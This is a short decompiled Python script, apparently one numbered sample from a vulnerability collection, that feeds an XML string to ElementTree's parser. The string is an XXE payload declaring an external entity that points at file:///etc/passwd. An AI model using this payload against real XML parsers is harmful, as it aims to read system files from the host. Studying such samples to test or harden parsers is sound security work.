# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 430_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 450 bytes
import xml.etree.ElementTree as ET

def parse_xml(xml_string):
    return ET.fromstring(xml_string)


xml_input = '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>\n  <data>&xxe;</data>\n</root>'
result = parse_xml(xml_input)
print(result)

# okay decompiling 430_1.pyc
